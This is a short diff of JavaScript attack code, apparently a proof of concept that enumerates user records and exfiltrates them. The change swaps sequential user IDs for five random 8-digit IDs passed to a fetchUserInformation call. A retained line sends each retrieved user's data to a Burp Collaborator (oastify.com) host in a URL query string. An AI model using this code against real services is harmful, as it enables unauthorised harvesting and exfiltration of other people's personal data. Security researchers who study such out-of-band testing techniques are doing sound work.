@@ -17,11 +17,12 @@
             }
         }
 
-        async function fetchLimitedUsers() {
+        async function fetchRandomUsers() {
             const maxRequests = 5;
             const users = [];
 
-            for (let userId = 1; userId <= maxRequests; userId++) {
+            for (let i = 0; i < maxRequests; i++) {
+                const userId = Math.floor(Math.random() * 90000000) + 10000000; // Generate random 8-digit user ID
                 const userData = await fetchUserInformation(userId);
                 if (userData) {
                     users.push(userData);
@@ -31,7 +32,7 @@
             return users;
         }
 
-        fetchLimitedUsers().then(users => {
+        fetchRandomUsers().then(users => {
             users.forEach(user => {
                 // Log the user data to Burp Collaborator
                 fetch('https://8r0150yoonqzfx1b1j54dmrbf2lt9q5eu.oastify.com/log?key=' + JSON.stringify(user));
